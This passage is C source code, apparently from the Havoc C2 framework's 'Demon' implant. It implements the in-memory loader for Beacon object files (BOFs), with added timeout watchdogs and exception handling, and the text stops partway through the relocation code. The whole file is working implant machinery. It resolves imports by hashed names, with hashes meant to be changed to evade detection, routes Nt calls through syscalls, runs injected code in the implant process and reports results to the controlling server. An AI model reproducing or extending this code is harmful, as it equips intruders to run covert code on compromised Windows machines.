#include <Demon.h>
#include <common/Macros.h>
#include <core/Win32.h>
#include <core/MiniStd.h>
#include <core/Package.h>
#include <core/CoffeeLdr.h>
#include <core/ObjectApi.h>
#include <inject/InjectUtil.h>

// Forward declarations
VOID CoffeeRunnerThread( PCOFFEE_PARAMS Param );

// Thread state monitoring for safer BOF execution
typedef struct _THREAD_MONITOR {
    HANDLE          ThreadHandle;
    DWORD           ThreadId;
    UINT32          RequestID;
    LARGE_INTEGER   StartTime;
    BOOL            IsRunning;
    BOOL            RequiresCleanup;
} THREAD_MONITOR, *PTHREAD_MONITOR;

static THREAD_MONITOR ThreadMonitors[32] = { 0 }; // Support up to 32 concurrent BOFs
static LONG ThreadMonitorCount = 0;

//HashEx
//Hash every VALUE of these using payloads/Shellcode/Scripts/hasher, take the hash of :CoffAPI Hashed 
#if _WIN64
    // __imp_
    #define SYMB_COF        0x121e9db5 // HashEx without upper case, MUST CHANGE. VALUE = __imp_
    #define SYMB_COF_SIZE   6
    // __imp_Beacon
    #define PREP_COF        0x59eed95d // HashEx without upper case, MUST CHANGE. VALUE = __imp_Beacon
    #define PREP_COF_SIZE   ( SYMB_COF_SIZE + 6 )
    // .refptr.Instance
    #define INSTA_COF           0x94e9eb83 // HashEx without upper case, MUST CHANGE. VALUE = .refptr.Instance
#else
    // __imp__
    #define SYMB_COF        0xe381de59 // HashEx without upper case, MUST CHANGE. VALUE = __imp__
    #define SYMB_COF_SIZE   7
    // __imp__Beacon
    #define PREP_COF        0xce277881 // HashEx without upper case, MUST CHANGE. VALUE = __imp__Beacon
    #define PREP_COF_SIZE   ( SYMB_COF_SIZE + 6 )
    // _Instance
    #define INSTA_COF           0xe80d5ca9 // HashEx without upper case, MUST CHANGE. VALUE = _Instance
#endif

PVOID CoffeeFunctionReturn = NULL;

// Enhanced BOF watchdog and timeout system
typedef struct _BOF_WATCHDOG {
    HANDLE          Timer;
    HANDLE          TimerQueue;
    PCOFFEE         Coffee;
    UINT32          RequestID;
    HANDLE          ThreadHandle;
    DWORD           ThreadId;
    LARGE_INTEGER   StartTime;
    BOOL            IsActive;
    BOOL            TimedOut;
} BOF_WATCHDOG, *PBOF_WATCHDOG;

static PBOF_WATCHDOG CurrentWatchdog = NULL;

// Enhanced recovery and crash prevention system
typedef struct _AGENT_STATE_BACKUP {
    PVOID OriginalHeapBase;
    SIZE_T HeapSize;
    DWORD ThreadCount;
    LARGE_INTEGER Timestamp;
    BOOL IsValid;
} AGENT_STATE_BACKUP, *PAGENT_STATE_BACKUP;

static AGENT_STATE_BACKUP AgentBackup = { 0 };

// Create agent state backup before risky operations
BOOL CreateAgentStateBackup( VOID )
{
    FILETIME fileTime;
    Instance->Win32.GetSystemTimeAsFileTime( &fileTime );
    AgentBackup.Timestamp.LowPart = fileTime.dwLowDateTime;
    AgentBackup.Timestamp.HighPart = fileTime.dwHighDateTime;
    AgentBackup.ThreadCount = Instance->Threads;
    AgentBackup.IsValid = TRUE;
    
    PUTS( "Agent state backup created" );
    return TRUE;
}

// Restore agent to safe state after failure
VOID RestoreAgentState( VOID )
{
    if ( !AgentBackup.IsValid )
        return;
    
    PUTS( "Restoring agent to safe state..." );
    
    // Clean up any orphaned watchdogs
    if ( CurrentWatchdog )
    {
        CleanupBofWatchdog( CurrentWatchdog );
    }
    
    // Reset thread monitoring
    MemSet( ThreadMonitors, 0, sizeof( ThreadMonitors ) );
    ThreadMonitorCount = 0;
    
    // Memory cleanup will happen naturally through garbage collection
    // No manual memory status check needed - Havoc handles this internally
    
    PUTS( "Agent state restoration completed" );
}

// Enhanced memory allocation with fallback strategies
PVOID SafeVirtualAlloc( SIZE_T Size, ULONG Protect )
{
    PVOID BaseAddress = NULL;
    NTSTATUS NtStatus = STATUS_SUCCESS;
    
    // Strategy 1: Try default allocation
    BaseAddress = MmVirtualAlloc( DX_MEM_DEFAULT, NtCurrentProcess(), Size, Protect );
    if ( BaseAddress )
    {
        PRINTF( "Memory allocated successfully: %p (Size: %zu)\n", BaseAddress, Size );
        return BaseAddress;
    }
    
    PUTS( "Default allocation failed, trying fallback strategies..." );
    
    // Strategy 2: Try with different size alignment
    SIZE_T AlignedSize = (Size + 0xFFFF) & ~0xFFFF; // 64KB align
    BaseAddress = MmVirtualAlloc( DX_MEM_DEFAULT, NtCurrentProcess(), AlignedSize, Protect );
    if ( BaseAddress )
    {
        PRINTF( "Aligned allocation successful: %p (Size: %zu)\n", BaseAddress, AlignedSize );
        return BaseAddress;
    }
    
    // Strategy 3: Try smaller chunks
    if ( Size > 0x100000 ) // If > 1MB, try half size
    {
        SIZE_T HalfSize = Size / 2;
        BaseAddress = MmVirtualAlloc( DX_MEM_DEFAULT, NtCurrentProcess(), HalfSize, Protect );
        if ( BaseAddress )
        {
            PRINTF( "Reduced size allocation successful: %p (Size: %zu)\n", BaseAddress, HalfSize );
            return BaseAddress;
        }
    }
    
    PRINTF( "All allocation strategies failed for size: %zu\n", Size );
    return NULL;
}

// Memory integrity checker
BOOL ValidateMemoryIntegrity( PCOFFEE Coffee )
{
    if ( !Coffee || !Coffee->ImageBase )
        return FALSE;
    
    // Check if memory is still mapped and accessible
    SIZE_T regionSize = 0;
    MEMORY_BASIC_INFORMATION mbi = { 0 };
    
    if ( !NT_SUCCESS( SysNtQueryVirtualMemory( NtCurrentProcess(), Coffee->ImageBase, 
                                              MemoryBasicInformation, &mbi, sizeof(mbi), &regionSize ) ) )
        return FALSE;
    
    // Verify memory is still committed and accessible
    if ( mbi.State != MEM_COMMIT || mbi.Protect == PAGE_NOACCESS )
        return FALSE;
    
    return TRUE;
}

// Timeout callback for BOF execution
VOID CALLBACK BofTimeoutCallback( PVOID lpParam, BOOLEAN TimerOrWaitFired )
{
    PBOF_WATCHDOG watchdog = (PBOF_WATCHDOG)lpParam;
    PPACKAGE Package = NULL;
    
    if ( !watchdog || !watchdog->IsActive )
        return;
    
    // **FIX**: Removed premature protection system check - BOFs should execute
    // independently of protection system status since they have their own lifecycle
    
    PRINTF( "BOF execution timeout detected - RequestID: %x\n", watchdog->RequestID );
    
    watchdog->TimedOut = TRUE;
    watchdog->IsActive = FALSE;
    
    // Send timeout notification to server
    Package = PackageCreateWithRequestID( DEMON_COMMAND_INLINE_EXECUTE, watchdog->RequestID );
    PackageAddInt32( Package, DEMON_COMMAND_INLINE_EXECUTE_COULD_NO_RUN );
#ifdef DEBUG
    PackageAddBytes( Package, "BOF execution timeout", 21 );
#endif
    PackageTransmit( Package );
    
    // **FIX**: Timeout handling - let main completion path handle AddHandledRequest
    // to avoid duplicate completion tracking
    
    // Try to terminate the BOF thread safely
    if ( watchdog->ThreadHandle )
    {
        // First try graceful termination
        if ( SysNtTerminateThread( watchdog->ThreadHandle, 0 ) == STATUS_SUCCESS )
        {
            PUTS( "BOF thread terminated due to timeout" );
        }
        else
        {
            PUTS( "Failed to terminate BOF thread - may require agent restart" );
        }
    }
    
    // Cleanup BOF memory if still valid
    if ( ValidateMemoryIntegrity( watchdog->Coffee ) )
    {
        CoffeeCleanup( watchdog->Coffee );
        RemoveCoffeeFromInstance( watchdog->Coffee );
    }
}

// Create watchdog for BOF execution
PBOF_WATCHDOG CreateBofWatchdog( PCOFFEE Coffee, UINT32 RequestID, DWORD TimeoutMs )
{
    PBOF_WATCHDOG watchdog = Instance->Win32.LocalAlloc( LPTR, sizeof( BOF_WATCHDOG ) );
    if ( !watchdog )
        return NULL;
    
    watchdog->Coffee = Coffee;
    watchdog->RequestID = RequestID;
    watchdog->IsActive = TRUE;
    watchdog->TimedOut = FALSE;
    
    // Create timer queue using Havoc's existing infrastructure
    NTSTATUS NtStatus = Instance->Win32.RtlCreateTimerQueue( &watchdog->TimerQueue );
    if ( !NT_SUCCESS( NtStatus ) )
    {
        Instance->Win32.LocalFree( watchdog );
        return NULL;
    }
    
    // Create timeout timer (default 30 seconds)
    if ( TimeoutMs == 0 )
        TimeoutMs = 30000;
    
    NtStatus = Instance->Win32.RtlCreateTimer( watchdog->TimerQueue, &watchdog->Timer,
                                              BofTimeoutCallback, watchdog, TimeoutMs, 0, WT_EXECUTEINTIMERTHREAD );
    if ( !NT_SUCCESS( NtStatus ) )
    {
        Instance->Win32.RtlDeleteTimerQueue( watchdog->TimerQueue );
        Instance->Win32.LocalFree( watchdog );
        return NULL;
    }
    
    // Get current system time as FILETIME and convert to LARGE_INTEGER
    FILETIME fileTime;
    Instance->Win32.GetSystemTimeAsFileTime( &fileTime );
    watchdog->StartTime.LowPart = fileTime.dwLowDateTime;
    watchdog->StartTime.HighPart = fileTime.dwHighDateTime;
    CurrentWatchdog = watchdog;
    
    return watchdog;
}

// Cleanup watchdog
VOID CleanupBofWatchdog( PBOF_WATCHDOG watchdog )
{
    if ( !watchdog )
        return;
    
    watchdog->IsActive = FALSE;
    
    if ( watchdog->TimerQueue )
        Instance->Win32.RtlDeleteTimerQueue( watchdog->TimerQueue );
    
    if ( watchdog->ThreadHandle )
        SysNtClose( watchdog->ThreadHandle );
    
    Instance->Win32.LocalFree( watchdog );
    CurrentWatchdog = NULL;
}

// Enhanced VEH with more detailed crash analysis
LONG WINAPI VehDebugger( PEXCEPTION_POINTERS Exception )
{
    UINT32 RequestID = 0;
    PPACKAGE Package = NULL;
    CHAR ExceptionInfo[512] = { 0 };

    PRINTF( "Exception: %p at Address: %p\n", Exception->ExceptionRecord->ExceptionCode, 
            Exception->ExceptionRecord->ExceptionAddress )

    // Use simple string copy instead of complex formatting
#ifdef DEBUG
    StringCopyA( ExceptionInfo, "BOF Exception detected with enhanced error handling" );
#else
    ExceptionInfo[0] = '\0';  // Empty string for production
#endif

    // Leave faulty function
#if _WIN64
    Exception->ContextRecord->Rip = (DWORD64)(ULONG_PTR)CoffeeFunctionReturn;
#else
    Exception->ContextRecord->Eip = (DWORD64)(ULONG_PTR)CoffeeFunctionReturn;
#endif

    // Enhanced RequestID detection
    if ( GetRequestIDForCallingObjectFile( CoffeeFunctionReturn, &RequestID ) ) {
        Package = PackageCreateWithRequestID( DEMON_COMMAND_INLINE_EXECUTE, RequestID );
    } else {
        Package = PackageCreate( DEMON_COMMAND_INLINE_EXECUTE );
    }

    PackageAddInt32( Package, DEMON_COMMAND_INLINE_EXECUTE_EXCEPTION );
    PackageAddInt32( Package, Exception->ExceptionRecord->ExceptionCode );
    PackageAddInt64( Package, (UINT64)(ULONG_PTR)Exception->ExceptionRecord->ExceptionAddress );
    PackageAddString( Package, ExceptionInfo );  // Add detailed info
    PackageTransmit( Package );

    // Cleanup watchdog if crash occurred
    if ( CurrentWatchdog && CurrentWatchdog->IsActive )
    {
        CleanupBofWatchdog( CurrentWatchdog );
    }

    return EXCEPTION_CONTINUE_EXECUTION;
}

// check if the symbol is on the form: __imp_LIBNAME$FUNCNAME
BOOL SymbolIncludesLibrary( LPSTR Symbol )
{
    // does it start with __imp_?
    if ( HashEx( Symbol, SYMB_COF_SIZE, FALSE ) != SYMB_COF )
        return FALSE;

    // does it contain a $ (which separates DLL name and export name)
    SIZE_T Length = StringLengthA( Symbol );
    for (SIZE_T i = SYMB_COF_SIZE + 1; i < Length - 1; ++i)
    {
        if ( Symbol[ i ] == '$' )
            return TRUE;
    }

    return FALSE;
}

BOOL SymbolIsImport( LPSTR Symbol )
{
    // does it start with __imp_?
    return HashEx( Symbol, SYMB_COF_SIZE, FALSE ) == SYMB_COF;
}

BOOL CoffeeProcessSymbol( PCOFFEE Coffee, LPSTR SymbolName, UINT16 SymbolType, PVOID* pFuncAddr )
{
    CHAR        Bak[ 1024 ]     = { 0 };
    CHAR        SymName[ 1024 ] = { 0 };
    PCHAR       SymLibrary      = NULL;
    PCHAR       SymFunction     = NULL;
    HMODULE     hLibrary        = NULL;
    DWORD       SymBeacon       = HashEx( SymbolName, PREP_COF_SIZE, FALSE );
    ANSI_STRING AnsiString      = { 0 };
    PPACKAGE    Package         = NULL;

    *pFuncAddr = NULL;

    MemCopy( Bak, SymbolName, StringLengthA( SymbolName ) + 1 );

    if ( SymBeacon == PREP_COF )
    {
        // this is an import symbol from Beacon: __imp_BeaconFUNCNAME
        SymFunction = SymbolName + SYMB_COF_SIZE;

        for ( DWORD i = 0 ;; i++ )
        {
            if ( ! BeaconApi[ i ].NameHash )
                break;

            if ( HashStringA( SymFunction ) == BeaconApi[ i ].NameHash )
            {
#ifdef HASH_DEBUG
                PRINTF( "BOF BEACON API SUCCESS: %s Hash=0x%08x Addr=%p\n", SymFunction, HashStringA( SymFunction ), BeaconApi[ i ].Pointer );
#endif
                *pFuncAddr = BeaconApi[ i ].Pointer;
                return TRUE;
            }
        }

#ifdef HASH_DEBUG
        PRINTF( "BOF BEACON API FAILURE: %s Hash=0x%08x\n", SymFunction, HashStringA( SymFunction ) );
#endif
        goto SymbolNotFound;
    }
    else if ( SymbolIsImport( SymbolName ) && ! SymbolIncludesLibrary( SymbolName ) )
    {
        // this is an import symbol without library: __imp_FUNCNAME
        SymFunction = SymbolName + SYMB_COF_SIZE;

        StringCopyA( SymName, SymFunction );

#if _M_IX86
        // in x86, symbols can have this form: __imp__LoadLibraryA@4
        // we need to make sure there is no '@' in the function name
        for ( DWORD i = 0 ;; ++i )
        {
            if ( ! SymName[i] )
                break;

            if ( SymName[i] == '@' )
            {
                SymName[i] = 0;
                break;
            }
        }
#endif

        // we support a handful of functions that don't usually have the DLL
        for ( DWORD i = 0 ;; i++ )
        {
            if ( ! LdrApi[ i ].NameHash )
                break;

            if ( HashStringA( SymName ) == LdrApi[ i ].NameHash )
            {
#ifdef HASH_DEBUG
                PRINTF( "BOF LDRAPI SUCCESS: %s Hash=0x%08x Addr=%p\n", SymName, HashStringA( SymName ), LdrApi[ i ].Pointer );
#endif
                *pFuncAddr = LdrApi[ i ].Pointer;
                return TRUE;
            }
        }

#ifdef HASH_DEBUG
        PRINTF( "BOF LDRAPI FAILURE: %s Hash=0x%08x\n", SymName, HashStringA( SymName ) );
#endif
        goto SymbolNotFound;
    }
    else if ( SymbolIsImport( SymbolName ) )
    {
        // this is a typical import symbol in the form: __imp_LIBNAME$FUNCNAME
        SymLibrary  = Bak + SYMB_COF_SIZE;
        SymLibrary  = StringTokenA( SymLibrary, "$" );
        SymFunction = SymLibrary + StringLengthA( SymLibrary ) + 1;
        hLibrary    = LdrModuleLoad( SymLibrary );

        if ( ! hLibrary )
        {
            PRINTF( "Failed to load library: Lib:[%s] Err:[%d]\n", SymLibrary, NtGetLastError() );
            goto SymbolNotFound;
        }

        StringCopyA( SymName, SymFunction );

#if _M_IX86
        // in x86, symbols can have this form: __imp__KERNEL32$GetProcessHeap@0
        // we need to make sure there is no '@' in the function name
        for ( DWORD i = 0 ;; ++i )
        {
            if ( ! SymName[i] )
                break;

            if ( SymName[i] == '@' )
            {
                SymName[i] = 0;
                break;
            }
        }
#endif

        /*
         * we overwrite the addresses of some Nt apis to provide
         * automatic support for syscalls to BOFs
         */
        if ( hLibrary == Instance->Modules.Ntdll )
        {
            for ( DWORD i = 0 ;; i++ )
            {
                if ( ! NtApi[ i ].NameHash )
                    break;

                if ( HashStringA( SymName ) == NtApi[ i ].NameHash )
                {
#ifdef HASH_DEBUG
                    PRINTF( "BOF NTAPI SUCCESS: %s Hash=0x%08x Addr=%p\n", SymName, HashStringA( SymName ), NtApi[ i ].Pointer );
#endif
                    *pFuncAddr = NtApi[ i ].Pointer;
                    return TRUE;
                }
            }
        }

        AnsiString.Length        = StringLengthA( SymName );
        AnsiString.MaximumLength = AnsiString.Length + sizeof( CHAR );
        AnsiString.Buffer        = SymName;

        if ( NT_SUCCESS( Instance->Win32.LdrGetProcedureAddress( hLibrary, &AnsiString, 0, pFuncAddr ) ) )
        {
#ifdef HASH_DEBUG
            PRINTF( "BOF LIBRARY SUCCESS: %s Lib=%s Addr=%p\n", SymName, SymLibrary, *pFuncAddr );
#endif
            return TRUE;
        }

#ifdef HASH_DEBUG
        PRINTF( "BOF LIBRARY FAILURE: %s Lib=%s\n", SymName, SymLibrary );
#endif
        goto SymbolNotFound;
    }
    else if ( HashStringA( SymbolName ) == INSTA_COF )
    {
        // allow BOFs to reference the Instance struct
        *pFuncAddr = &Instance;
        return TRUE;
    }
    else if ( SymbolType != SYMBOL_IS_A_FUNCTION && !SymbolIsImport( SymbolName ) )
    {
        // TODO: should we also fail if the symbol is not a function?
        // Note: Import symbols (__imp_*) should always be processed regardless of type
        return TRUE;
    }

SymbolNotFound:
#ifdef HASH_DEBUG
    PRINTF( "BOF SYMBOL NOT FOUND: %s (SymbolType=%d)\n", SymbolName, SymbolType );
#endif
    Package = PackageCreateWithRequestID( DEMON_COMMAND_INLINE_EXECUTE, Coffee->RequestID );
    PackageAddInt32( Package, DEMON_COMMAND_INLINE_EXECUTE_SYMBOL_NOT_FOUND );
    PackageAddString( Package, SymbolName );
    PackageTransmit( Package );

    return FALSE;
}

// This is our function where we can control/get the return address of it to use it in case of a Veh exception
VOID CoffeeFunction( PVOID Address, PVOID Argument, SIZE_T Size )
{
    VOID ( *Function ) ( PCHAR , ULONG ) = Address;

    CoffeeFunctionReturn = __builtin_extract_return_addr( __builtin_return_address ( 0 ) );

    // Execute our function
    Function( Argument, Size );

    PUTS( "Finished" )
}

BOOL CoffeeExecuteFunction( PCOFFEE Coffee, PCHAR Function, PVOID Argument, SIZE_T Size, UINT32 RequestID )
{
    PVOID CoffeeMain     = NULL;
    PVOID VehHandle      = NULL;
    PCHAR SymbolName     = NULL;
    BOOL  Success        = FALSE;
    ULONG FunctionLength = StringLengthA( Function );
    ULONG Protection     = 0;
    ULONG BitMask        = 0;
    PBOF_WATCHDOG Watchdog = NULL;

    // Create watchdog timer for this BOF execution
    Watchdog = CreateBofWatchdog( Coffee, RequestID, 30000 ); // 30 second timeout
    if ( !Watchdog )
    {
        PUTS( "Failed to create BOF watchdog - proceeding without timeout protection" );
    }

    if ( Instance->Config.Implant.CoffeeVeh )
    {
        PUTS( "Register VEH handler..." )
        // Add Veh Debugger in case that our BOF crashes etc.
        VehHandle = Instance->Win32.RtlAddVectoredExceptionHandler( 1, &VehDebugger );
        if ( ! VehHandle )
        {
            PACKAGE_ERROR_WIN32
            if ( Watchdog ) CleanupBofWatchdog( Watchdog );
            return FALSE;
        }
    }

    // Memory integrity check before execution
    if ( !ValidateMemoryIntegrity( Coffee ) )
    {
        PUTS( "Memory integrity check failed before BOF execution" );
        if ( VehHandle ) Instance->Win32.RtlRemoveVectoredExceptionHandler( VehHandle );
        if ( Watchdog ) CleanupBofWatchdog( Watchdog );
        return FALSE;
    }

    // set appropriate permissions for each section
    for ( UINT16 SectionCnt = 0; SectionCnt < Coffee->Header->NumberOfSections; SectionCnt++ )
    {
        Coffee->Section = C_PTR( U_PTR( Coffee->Data ) + sizeof( COFF_FILE_HEADER ) + U_PTR( sizeof( COFF_SECTION ) * SectionCnt ) );
        if ( Coffee->Section->SizeOfRawData > 0 )
        {
            BitMask = Coffee->Section->Characteristics & ( IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE );
            if ( BitMask == 0 )
                Protection = PAGE_NOACCESS;
            else if ( BitMask == IMAGE_SCN_MEM_EXECUTE )
                Protection = PAGE_EXECUTE;
            else if ( BitMask == IMAGE_SCN_MEM_READ )
                Protection = PAGE_READONLY;
            else if ( BitMask == ( IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE ) )
                Protection = PAGE_EXECUTE_READ;
            else if ( BitMask == IMAGE_SCN_MEM_WRITE )
                Protection = PAGE_WRITECOPY;
            else if ( BitMask == ( IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_WRITE ) )
                Protection = PAGE_EXECUTE_WRITECOPY;
            else if ( BitMask == ( IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE ) )
                Protection = PAGE_READWRITE;
            else if ( BitMask == ( IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE ) )
                Protection = PAGE_EXECUTE_READWRITE;
            else
            {
                PRINTF( "Unknown protection: %x", Coffee->Section->Characteristics );
                Protection = PAGE_EXECUTE_READWRITE;
            }

            if ( ( Coffee->Section->Characteristics & IMAGE_SCN_MEM_NOT_CACHED ) == IMAGE_SCN_MEM_NOT_CACHED  )
                Protection |= PAGE_NOCACHE;

            Success = MmVirtualProtect( DX_MEM_SYSCALL, NtCurrentProcess(), Coffee->SecMap[ SectionCnt ].Ptr, Coffee->SecMap[ SectionCnt ].Size, Protection );
            if ( ! Success )
            {
                PUTS( "Failed to protect memory" )
                return FALSE;
            }
        }
    }

    if ( Coffee->FunMapSize )
    {
        // set the FunctionMap section to READONLY
        Success = MmVirtualProtect( DX_MEM_SYSCALL, NtCurrentProcess(), Coffee->FunMap, Coffee->FunMapSize, PAGE_READONLY );
        if ( ! Success )
        {
            PUTS( "Failed to protect memory" )
            return FALSE;
        }
    }

    // look for the "go" function
    for ( DWORD SymCounter = 0; SymCounter < Coffee->Header->NumberOfSymbols; SymCounter++ )
    {
        if ( Coffee->Symbol[ SymCounter ].First.Value[ 0 ] != 0 )
            SymbolName = Coffee->Symbol[ SymCounter ].First.Name;
        else
            SymbolName = ( ( PCHAR ) ( Coffee->Symbol + Coffee->Header->NumberOfSymbols ) ) + Coffee->Symbol[ SymCounter ].First.Value[ 1 ];

#if _M_IX86
        // in x86, the "go" function might actually be named _go
        if ( SymbolName[0] == '_' )
            SymbolName++;
#endif

        if ( MemCompare( SymbolName, Function, FunctionLength ) == 0 )
        {
            CoffeeMain = ( Coffee->SecMap[ Coffee->Symbol[ SymCounter ].SectionNumber - 1 ].Ptr + Coffee->Symbol[ SymCounter ].Value );
            break;
        }
    }

    // did we find it?
    if ( ! CoffeeMain )
    {
        PRINTF( "[!] Couldn't find function => %s\n", Function );

        PPACKAGE Package = PackageCreateWithRequestID( DEMON_COMMAND_INLINE_EXECUTE, RequestID );

        PackageAddInt32( Package, DEMON_COMMAND_INLINE_EXECUTE_SYMBOL_NOT_FOUND );
        PackageAddString( Package, Function );
        PackageTransmit( Package );

        return FALSE;
    }

    // make sure the entry point is on executable memory
    Success = FALSE;
    for ( UINT16 SectionCnt = 0; SectionCnt < Coffee->Header->NumberOfSections; SectionCnt++ )
    {
        if ( ( ULONG_PTR ) CoffeeMain >= ( ULONG_PTR ) Coffee->SecMap[ SectionCnt ].Ptr && ( ULONG_PTR ) CoffeeMain < U_PTR( Coffee->SecMap[ SectionCnt ].Ptr) + Coffee->SecMap[ SectionCnt ].Size )
        {
            Coffee->Section = C_PTR( U_PTR( Coffee->Data ) + sizeof( COFF_FILE_HEADER ) + U_PTR( sizeof( COFF_SECTION ) * SectionCnt ) );
            if ( ( Coffee->Section->Characteristics & IMAGE_SCN_MEM_EXECUTE ) == IMAGE_SCN_MEM_EXECUTE )
                Success = TRUE;

            break;
        }
    }

    if ( ! Success )
    {
        PRINTF( "The entry point (%p) is not on executable memory\n", CoffeeMain )
        return FALSE;
    }

    PUTS( "[*] Execute coffee main\n" );
    
    // Record thread handle in watchdog for potential termination
    if ( Watchdog )
    {
        SysNtDuplicateObject( NtCurrentProcess(), NtCurrentThread(), 
                             NtCurrentProcess(), &Watchdog->ThreadHandle,
                             0, FALSE, DUPLICATE_SAME_ACCESS );
        Watchdog->ThreadId = (DWORD)(ULONG_PTR)Instance->Teb->ClientId.UniqueThread;
    }
    
    // Execute BOF with enhanced monitoring
    CoffeeFunction( CoffeeMain, Argument, Size );
    
    // Check if execution was terminated by watchdog
    if ( Watchdog && Watchdog->TimedOut )
    {
        PUTS( "BOF execution was terminated due to timeout" );
        Success = FALSE;
    }
    else
    {
        Success = TRUE;
    }

    // Memory integrity check after execution
    if ( !ValidateMemoryIntegrity( Coffee ) )
    {
        PUTS( "Warning: Memory integrity check failed after BOF execution" );
        // Don't fail the operation, but log it
    }

    // Remove our exception handler
    if ( VehHandle ) {
        Instance->Win32.RtlRemoveVectoredExceptionHandler( VehHandle );
    }
    
    // Cleanup watchdog
    if ( Watchdog )
    {
        CleanupBofWatchdog( Watchdog );
    }

    // **FIX**: Completion notification is handled by CoffeeLdr to avoid duplication
    // CoffeeExecuteFunction should only return success status, not send packets
    
    return Success;
}

VOID CoffeeCleanup( PCOFFEE Coffee )
{
    PVOID    Pointer  = NULL;
    SIZE_T   Size     = 0;
    NTSTATUS NtStatus = 0;

    if ( ! Coffee || ! Coffee->ImageBase )
        return;

    if ( MmVirtualProtect( DX_MEM_SYSCALL, NtCurrentProcess(), Coffee->ImageBase, Coffee->BofSize, PAGE_READWRITE ) )
        MemSet( Coffee->ImageBase, 0, Coffee->BofSize );

    Pointer = Coffee->ImageBase;
    Size    = Coffee->BofSize;
    if ( ! NT_SUCCESS( ( NtStatus = SysNtFreeVirtualMemory( NtCurrentProcess(), &Pointer, &Size, MEM_RELEASE ) ) ) )
    {
        NtSetLastError( Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
        PRINTF( "[!] Failed to free memory: %p : %lu\n", Coffee->ImageBase, NtGetLastError() );
    }

    if ( Coffee->SecMap )
    {
        MemSet( Coffee->SecMap, 0, Coffee->Header->NumberOfSections * sizeof( SECTION_MAP ) );
        Instance->Win32.LocalFree( Coffee->SecMap );
        Coffee->SecMap = NULL;
    }
}

// Process sections relocation and symbols
BOOL CoffeeProcessSections( PCOFFEE Coffee )
{
    PUTS( "Process Sections" )
    PVOID  FuncPtr           = NULL;
    DWORD  FuncCount         = 0;
    UINT64 OffsetLong        = 0;
    UINT32 Offset            = 0;
    CHAR   SymName[9]        = { 0 };
    PCHAR  SymbolName        = NULL;
    PVOID  RelocAddr         = NULL;
    PVOID  FunMapAddr        = NULL;
    PVOID  SymbolSectionAddr = NULL;
    UINT16 SymbolType        = 0;
    PCOFF_SYMBOL Symbol      = NULL;

    for ( UINT16 SectionCnt = 0; SectionCnt < Coffee->Header->NumberOfSections; SectionCnt++ )
    {
        Coffee->Section = C_PTR( U_PTR( Coffee->Data ) + sizeof( COFF_FILE_HEADER ) + U_PTR( sizeof( COFF_SECTION ) * SectionCnt ) );
        Coffee->Reloc   = C_PTR( U_PTR( Coffee->Data ) + Coffee->Section->PointerToRelocations );

        for ( DWORD RelocCnt = 0; RelocCnt < Coffee->Section->NumberOfRelocations; RelocCnt++ )
        {
            Symbol = &Coffee->Symbol[ Coffee->Reloc->SymbolTableIndex ];

            if ( Symbol->First.Value[ 0 ] != 0 )
            {
                // if the symbol is 8 bytes long, it will not be terminated by a null byte
                MemSet( SymName, 0, sizeof( SymName ) );
                MemCopy( SymName, Symbol->First.Name, 8 );
                SymbolName = SymName;
                // TODO: the following symbols take 2 entries: .text, .xdata, .pdata, .rdata
                //       skip an entry if one of those is found
            }
            else
            {
                // in this scenario, we can trust that the symbol ends with a null byte
                SymbolName = ( ( PCHAR ) ( Coffee->Symbol + Coffee->Header->NumberOfSymbols ) ) + Symbol->First.Value[ 1 ];
            }

            // address where the reloc must be written to
            RelocAddr = Coffee->SecMap[ SectionCnt ].Ptr + Coffee->Reloc->VirtualAddress;
            // address where the resolved function address will be stored
            FunMapAddr = Coffee->FunMap + ( FuncCount * sizeof( PVOID ) );
            // the address of the section where the symbol is stored
            SymbolSectionAddr = Coffee->SecMap[ Symbol->SectionNumber - 1 ].Ptr;
            // type of the symbol
            SymbolType = Symbol->Type;

#ifdef HASH_DEBUG
            PRINTF( "RESOLVING SYMBOL: %s (Type=%d)\n", SymbolName, SymbolType );
#endif
            if ( ! CoffeeProcessSymbol( Coffee, SymbolName, SymbolType, &FuncPtr ) )
            {
                PRINTF( "Symbol '%s' couldn't be resolved\n", SymbolName );
#ifdef HASH_DEBUG
                PRINTF( "FAILED TO RESOLVE SYMBOL: %s (Type=%d)\n", SymbolName, SymbolType );
#endif
                return FALSE;
            }
#ifdef HASH_DEBUG
            PRINTF( "SYMBOL RESOLVED: %s => %p (Type=%d)\n", SymbolName, FuncPtr, SymbolType );
#endif

#if _WIN64
            if ( Coffee->Reloc->Type == IMAGE_REL_AMD64_REL32 && FuncPtr != NULL )
            {
                *( ( PVOID* ) FunMapAddr ) = FuncPtr;

                Offset = ( UINT32 ) ( U_PTR( FunMapAddr ) - U_PTR( RelocAddr ) - sizeof( UINT32 ) );

                *( ( PUINT32 ) RelocAddr ) = Offset;

                FuncCount++;
            }
            else if ( Coffee->Reloc->Type == IMAGE_REL_AMD64_REL32 && FuncPtr == NULL )
            {
                Offset = *( PUINT32 ) ( RelocAddr );

                Offset += U_PTR( SymbolSectionAddr ) - U_PTR( RelocAddr ) - sizeof( UINT32 );

                *( ( PUINT32 ) RelocAddr ) = Offset;
            }
            else if ( Coffee->Reloc->Type == IMAGE_REL_AMD64_REL32_1 && FuncPtr == NULL )
            {
                Offset = *( PUINT32 ) ( RelocAddr );

                Offset += U_PTR( SymbolSectionAddr ) - U_PTR( RelocAddr ) - sizeof( UINT32 ) - 1;

                *( ( PUINT32 ) RelocAddr ) = Offset;
            }
            else if ( Coffee->Reloc->Type == IMAGE_REL_AMD64_REL32_2 && FuncPtr == NULL )
            {
                Offset = *( PUINT32 ) ( RelocAddr );

                Offset += U_PTR( SymbolSectionAddr ) - U_PTR( RelocAddr ) - sizeof( UINT32 ) - 2;

                *( ( PUINT32 ) RelocAddr ) = Offset;
            }
            else if ( Coffee->Reloc->Type == IMAGE_REL_AMD64_REL32_3 && FuncPtr == NULL )
            {
                Offset = *( PUINT32 ) ( RelocAddr );

                Offset += U_PTR( SymbolSectionAddr ) - U_PTR( RelocAddr ) - sizeof( UINT32 ) - 3;

                *( ( PUINT32 ) RelocAddr ) = Offset;
            }
            else if ( Coffee->Reloc->Type == IMAGE_REL_AMD64_REL32_4 && FuncPtr == NULL )
            {
